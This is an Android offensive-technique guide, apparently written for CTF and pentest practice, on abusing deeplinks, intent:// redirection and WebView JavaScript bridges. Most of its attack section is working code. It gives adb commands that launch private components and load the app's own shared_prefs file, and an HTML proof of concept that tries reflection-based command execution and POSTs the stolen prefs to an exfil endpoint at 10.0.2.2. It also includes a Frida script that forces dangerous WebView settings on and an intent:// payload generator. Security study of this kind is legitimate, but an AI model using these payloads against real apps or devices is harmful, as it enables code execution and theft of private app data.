---
title: "Deeplinks, Intent Redirection and WebView Bugs"
category: mobile
subcategory: ipc
type: technique
tags: [deeplink, applinks, intent-scheme, intent-redirection, webview, addjavascriptinterface, javascriptinterface, file-scheme, universal-xss, setallowfileaccess, shouldoverrideurlloading, adb, android, xss, ssrf]
difficulty: medium
summary: "Turn an app's URL handlers into an attack surface: intent:// redirection into private components, and WebView JS bridges into code execution and file theft."
when_to_use:
  - "The manifest declares a custom scheme or an autoVerify App Link"
  - "You see addJavascriptInterface, loadUrl, or setAllowFileAccessFromFileURLs"
  - "An exported activity takes a URL and loads it"
tools: [adb, jadx, apktool, frida, python]
related: [android-exported-components, android-frida-basics, mobile-traffic-interception, android-data-extraction]
---

## TL;DR

Two independent bug classes that live in the same place. **Intent redirection**: an
exported component parses an attacker-supplied Intent/component name and starts it,
giving you the privileges of the app to reach non-exported components. **WebView**:
`addJavascriptInterface` exposes Java to JS, and `setAllowUniversalAccessFromFileURLs`
lets a `file://` page read the whole sandbox. Both are driven from `adb shell am start`.

## Recognise it

Manifest:

```xml
<activity android:name=".DeepLinkActivity" android:exported="true">
  <intent-filter android:autoVerify="true">
    <action android:name="android.intent.action.VIEW"/>
    <category android:name="android.intent.category.DEFAULT"/>
    <category android:name="android.intent.category.BROWSABLE"/>
    <data android:scheme="ctfapp" android:host="open"/>
    <data android:scheme="https" android:host="app.ctf.example" android:pathPrefix="/l"/>
  </intent-filter>
</activity>
```

Code smells:

- `startActivity((Intent) getIntent().getParcelableExtra("forward"))` - intent redirection.
- `Intent.parseUri(url, Intent.URI_INTENT_SCHEME)` then `startActivity` - intent scheme.
- `webView.addJavascriptInterface(new Bridge(), "android")`.
- `settings.setJavaScriptEnabled(true)` plus `setAllowFileAccess(true)`,
  `setAllowFileAccessFromFileURLs(true)`, `setAllowUniversalAccessFromFileURLs(true)`.
- `shouldOverrideUrlLoading` returning `false` for every URL (open redirect into the WebView).
- `webView.loadUrl(getIntent().getStringExtra("url"))`.
- `setWebContentsDebuggingEnabled(true)` - remote debug the WebView from Chrome.

## Theory

### Deeplink resolution

- **Custom scheme** (`ctfapp://`): anyone can register it, no verification; a malicious app
  can hijack it. Reachable from a browser link and from `am start`.
- **App Link** (`https://` + `autoVerify="true"`): Android fetches
  `https://<host>/.well-known/assetlinks.json` and only binds the app if the signing-cert
  SHA-256 matches. If verification fails the link opens in the browser instead.
- `BROWSABLE` category is what allows a web page to trigger it.

### The intent: scheme

A web page can hand the system a serialised Intent:

```
intent://host/path#Intent;scheme=ctfapp;package=com.ctf.app;
  S.extra_key=value;component=com.ctf.app/.PrivateActivity;end
```

Chrome parses this with `Intent.parseUri(..., URI_INTENT_SCHEME)` and strips
`component`/`selector` for safety - but an **app** that calls `Intent.parseUri` itself
usually does not strip anything, which is the bug. Extra type prefixes in the fragment:
`S.` string, `i.` int, `l.` long, `B.` boolean, `f.` float, `d.` double, `b.` byte.

### Intent redirection

Pattern:

```java
Intent inner = getIntent().getParcelableExtra("nextIntent");
startActivity(inner);            // runs with the app's identity
```

You control `inner` completely, so you can target `com.ctf.app/.NotExportedActivity`,
or add `FLAG_GRANT_READ_URI_PERMISSION` and a `content://` data URI to make the victim
app read its own private file and hand it to you.

### WebView bridges

`addJavascriptInterface(obj, "name")` exposes every `@JavascriptInterface`-annotated
method of `obj` to JS as `name.method()`. Below API 17 the annotation was not required
and **every public method including inherited ones** was reachable, which gives
reflection-based RCE:

```js
name.getClass().forName("java.lang.Runtime").getMethod("getRuntime", null)
    .invoke(null, null).exec(["/bin/sh","-c","id"]);
```

On API 17+ you need a `@JavascriptInterface` method that is itself dangerous
(file read, token getter, `exec` wrapper).

File-scheme settings:

| Setting | Effect when true |
|---|---|
| `setAllowFileAccess` | WebView may load `file://` URLs at all (default true below API 30) |
| `setAllowFileAccessFromFileURLs` | a `file://` page may XHR other `file://` files |
| `setAllowUniversalAccessFromFileURLs` | a `file://` page may XHR **any** origin - full sandbox read + exfil |
| `setAllowContentAccess` | WebView may load `content://` URIs |

## Attack

1. List every scheme/host/path from the manifest.
2. Fire each deeplink with `am start` and watch logcat + the screen.
3. Look for a parameter that becomes a URL (`?url=`, `?redirect=`, `?next=`) and point it
   at your own page or at `file:///data/data/<pkg>/shared_prefs/prefs.xml`.
4. If the app calls `Intent.parseUri`, build an `intent://` URI targeting a private
   component.
5. If a JS bridge exists, host a page that enumerates it and calls every method.
6. If `setWebContentsDebuggingEnabled(true)`, attach Chrome DevTools and skip all of that.

## Code

### Firing deeplinks

```bash
# custom scheme
adb shell am start -a android.intent.action.VIEW -d "ctfapp://open/profile?id=1"

# with the BROWSABLE category, exactly as a browser would
adb shell am start -a android.intent.action.VIEW \
  -c android.intent.category.BROWSABLE -d "ctfapp://open/admin"

# https app link (bypasses verification because we name the component)
adb shell am start -a android.intent.action.VIEW \
  -d "https://app.ctf.example/l/flag" -n com.ctf.app/.DeepLinkActivity

# check whether app-link verification actually succeeded
adb shell pm get-app-links com.ctf.app
adb shell dumpsys package domain-preferred-apps | grep -A5 com.ctf.app

# who else claims this scheme (hijack check)
adb shell pm query-activities -a android.intent.action.VIEW -d "ctfapp://open"

# open-redirect into the webview
adb shell am start -a android.intent.action.VIEW \
  -d "ctfapp://open/web?url=http://10.0.2.2:8000/poc.html"

# point the webview at the app's own private file
adb shell am start -a android.intent.action.VIEW \
  -d "ctfapp://open/web?url=file:///data/data/com.ctf.app/shared_prefs/prefs.xml"

# intent: scheme targeting a private component (works if the app calls Intent.parseUri)
adb shell am start -a android.intent.action.VIEW -d \
 "intent://x/#Intent;scheme=ctfapp;package=com.ctf.app;component=com.ctf.app/.PrivateActivity;S.flag=give;end"

# nested-intent redirection via an extra
adb shell am start -n com.ctf.app/.RedirectActivity \
  --es target "com.ctf.app/.PrivateActivity"
```

### PoC page for a JS bridge

```html
<!doctype html>
<html>
<head><meta charset="utf-8"><title>bridge poc</title></head>
<body>
<pre id="out"></pre>
<script>
// bridge-poc.html - enumerate every injected JS interface and call its zero-arg methods
function log(s) { document.getElementById('out').textContent += s + '\n'; }

function enumerateBridges() {
  var found = [];
  for (var key in window) {
    try {
      var v = window[key];
      if (v && typeof v === 'object' && key !== 'window' &&
          ('' + v).indexOf('[object Object]') === 0) { found.push(key); }
    } catch (e) { /* cross-origin property */ }
  }
  return found;
}

var names = enumerateBridges();
log('candidate bridges: ' + names.join(', '));

names.forEach(function (n) {
  var o = window[n];
  for (var m in o) {
    if (typeof o[m] === 'function') {
      log(n + '.' + m + '()');
      try { log('  -> ' + o[m]()); } catch (e) { log('  !! ' + e); }
    }
  }
});

// pre-API-17 reflection RCE: any injected object leaks getClass()
names.forEach(function (n) {
  try {
    var r = window[n].getClass().forName('java.lang.Runtime')
        .getMethod('getRuntime', null).invoke(null, null);
    var p = r.exec(['/system/bin/sh', '-c', 'id > /data/data/com.ctf.app/pwned.txt']);
    log('legacy RCE fired via ' + n);
  } catch (e) { /* API 17+ or no getClass */ }
});

// universal file access: steal the app's own shared_prefs and exfil
var x = new XMLHttpRequest();
x.onreadystatechange = function () {
  if (x.readyState === 4) {
    log('prefs: ' + x.responseText.slice(0, 200));
    var e = new XMLHttpRequest();
    e.open('POST', 'http://10.0.2.2:8000/exfil', true);
    e.send(x.responseText);
  }
};
try {
  x.open('GET', 'file:///data/data/com.ctf.app/shared_prefs/prefs.xml', true);
  x.send(null);
} catch (e) { log('file read blocked: ' + e); }
</script>
</body>
</html>
```

Serve it and make the emulator reach your host at `10.0.2.2`:

```bash
python3 -m http.server 8000
adb shell am start -a android.intent.action.VIEW -d "ctfapp://open/web?url=http://10.0.2.2:8000/bridge-poc.html"
```

### Frida: log every WebView and Intent operation

```js
// webview-intent-log.js - see which URLs the app loads and which intents it fires
// run: frida -U -f com.ctf.app -l webview-intent-log.js --no-pause
'use strict';

Java.perform(function () {
  var WebView = Java.use('android.webkit.WebView');

  WebView.loadUrl.overload('java.lang.String').implementation = function (url) {
    console.log('[wv] loadUrl: ' + url);
    return this.loadUrl(url);
  };
  WebView.loadUrl.overload('java.lang.String', 'java.util.Map').implementation = function (url, h) {
    console.log('[wv] loadUrl+headers: ' + url);
    return this.loadUrl(url, h);
  };
  WebView.loadDataWithBaseURL.implementation = function (base, data, mime, enc, hist) {
    console.log('[wv] loadDataWithBaseURL base=' + base + ' data=' + ('' + data).slice(0, 200));
    return this.loadDataWithBaseURL(base, data, mime, enc, hist);
  };
  WebView.addJavascriptInterface.implementation = function (obj, name) {
    console.log('[wv] addJavascriptInterface name="' + name + '" class=' + obj.$className);
    return this.addJavascriptInterface(obj, name);
  };
  WebView.evaluateJavascript.implementation = function (js, cb) {
    console.log('[wv] evaluateJavascript: ' + ('' + js).slice(0, 200));
    return this.evaluateJavascript(js, cb);
  };

  // force the dangerous settings on, so you can test the file:// read path
  var WebSettings = Java.use('android.webkit.WebSettings');
  ['setJavaScriptEnabled', 'setAllowFileAccess', 'setAllowContentAccess',
   'setAllowFileAccessFromFileURLs', 'setAllowUniversalAccessFromFileURLs'].forEach(function (m) {
    if (!WebSettings[m]) { return; }
    WebSettings[m].implementation = function (v) {
      console.log('[wv] ' + m + '(' + v + ') -> forcing true');
      return this[m](true);
    };
  });

  // enable remote debugging so chrome://inspect can see the webview
  WebView.setWebContentsDebuggingEnabled.implementation = function (v) {
    console.log('[wv] setWebContentsDebuggingEnabled -> true');
    return this.setWebContentsDebuggingEnabled(true);
  };

  // ---- intents ---------------------------------------------------------------
  var Intent = Java.use('android.content.Intent');
  Intent.getStringExtra.implementation = function (k) {
    var v = this.getStringExtra(k);
    console.log('[intent] getStringExtra("' + k + '") = ' + v);
    return v;
  };
  Intent.getParcelableExtra.overload('java.lang.String').implementation = function (k) {
    var v = this.getParcelableExtra(k);
    console.log('[intent] getParcelableExtra("' + k + '") = ' + v);
    return v;
  };
  Intent.parseUri.implementation = function (uri, flags) {
    console.log('[intent] parseUri("' + uri + '", ' + flags + ')  <-- redirection candidate');
    return this.parseUri(uri, flags);
  };

  var Activity = Java.use('android.app.Activity');
  Activity.startActivity.overload('android.content.Intent').implementation = function (i) {
    console.log('[intent] startActivity ' + i.toString() + ' comp=' + i.getComponent());
    return this.startActivity(i);
  };
});
```

### Remote-debugging a WebView

```bash
# the app must have called setWebContentsDebuggingEnabled(true)
# (force it with the frida hook above)
adb forward tcp:9222 localabstract:webview_devtools_remote_$(adb shell pidof -s com.ctf.app)
curl -s http://127.0.0.1:9222/json | head -40
# then open chrome://inspect in desktop Chrome and click "inspect"
```

### Generating intent:// payloads

```python
#!/usr/bin/env python3
"""intent_uri.py - build intent: scheme URIs for deeplink/redirection testing.

Usage:
  python3 intent_uri.py --package com.ctf.app --component com.ctf.app/.PrivateActivity \
      --extra flag=give --extra-int level=9
"""
from __future__ import annotations

import argparse
import sys
from urllib.parse import quote


def build(scheme: str, host: str, path: str, package: str | None, component: str | None,
          action: str, strings: dict[str, str], ints: dict[str, int],
          bools: dict[str, bool], flags: int | None) -> str:
    parts = [f"intent://{host}{path}#Intent", f"scheme={scheme}", f"action={action}"]
    if package:
        parts.append(f"package={package}")
    if component:
        parts.append(f"component={component}")
    if flags is not None:
        parts.append(f"launchFlags=0x{flags:x}")
    parts += [f"S.{k}={quote(v, safe='')}" for k, v in strings.items()]
    parts += [f"i.{k}={v}" for k, v in ints.items()]
    parts += [f"B.{k}={'true' if v else 'false'}" for k, v in bools.items()]
    parts.append("end")
    return ";".join(parts)


def kv(pairs: list[str]) -> dict[str, str]:
    return dict(p.split("=", 1) for p in pairs if "=" in p)


def main() -> int:
    ap = argparse.ArgumentParser(description="intent: scheme URI builder")
    ap.add_argument("--scheme", default="ctfapp")
    ap.add_argument("--host", default="x")
    ap.add_argument("--path", default="/")
    ap.add_argument("--package")
    ap.add_argument("--component")
    ap.add_argument("--action", default="android.intent.action.VIEW")
    ap.add_argument("--extra", action="append", default=[], help="key=value string extra")
    ap.add_argument("--extra-int", action="append", default=[], help="key=123")
    ap.add_argument("--extra-bool", action="append", default=[], help="key=true")
    ap.add_argument("--flags", type=lambda s: int(s, 0), default=None)
    a = ap.parse_args()

    uri = build(a.scheme, a.host, a.path, a.package, a.component, a.action,
                kv(a.extra), {k: int(v) for k, v in kv(a.extra_int).items()},
                {k: v.lower() == "true" for k, v in kv(a.extra_bool).items()}, a.flags)
    print(uri)
    print("\nadb shell am start -a android.intent.action.VIEW "
          "-c android.intent.category.BROWSABLE -d '" + uri + "'")
    print('\n<a href="' + uri.replace('"', "&quot;") + '">click</a>')
    return 0


if __name__ == "__main__":
    if len(sys.argv) == 1:
        u = build("ctfapp", "x", "/", "com.ctf.app", "com.ctf.app/.PrivateActivity",
                  "android.intent.action.VIEW", {"flag": "give me"}, {"level": 9},
                  {"debug": True}, 0x10000000)
        assert u.startswith("intent://x/#Intent;")
        assert "component=com.ctf.app/.PrivateActivity" in u
        assert "S.flag=give%20me" in u
        assert "i.level=9" in u and "B.debug=true" in u
        print(u)
        print("selftest ok")
    else:
        sys.exit(main())
```

## Variants & pitfalls

- **App Link verification**: if `pm get-app-links` shows `verified`, a browser goes
  straight to the app; if `legacy_failure`, your `https://` deeplink needs `-n`.
- **`file://` XHR returns empty** on API 30+ - `setAllowFileAccess` defaults to false
  there. Force it with the Frida hook, or use `content://` instead.
- **`shouldOverrideUrlLoading` returning true only for known hosts** - try
  `https://known.host@evil.tld/`, `https://known.host.evil.tld/`, and scheme confusion
  (`javascript:`, `intent:`, `data:`).
- **Chrome strips `component=` and `selector=`** from `intent://`, so a browser-delivered
  payload cannot name a private component - but it works from `am start`, from another
  app, and in-browser if the *app* re-parses the URI itself.
- **`grantUriPermission` + redirection** makes the app read its own `content://` file for
  you; add `--grant-read-uri-permission` to `am start`.

## Tools

- `adb` (`am start`, `pm get-app-links`, `pm query-activities`).
- `jadx` - read the deeplink router and the bridge class.
- `frida` - log URLs, force settings, enumerate bridges at runtime.
- Chrome `chrome://inspect` - full DevTools on a debuggable WebView.
- `drozer` - `app.activity.start` with arbitrary intent construction.

## References

- Android developer documentation: deep links, Android App Links and `assetlinks.json`.
- Android developer documentation: `WebView`, `WebSettings`, `addJavascriptInterface` security notes.
- Android source for `Intent.parseUri` and the `URI_INTENT_SCHEME` format.
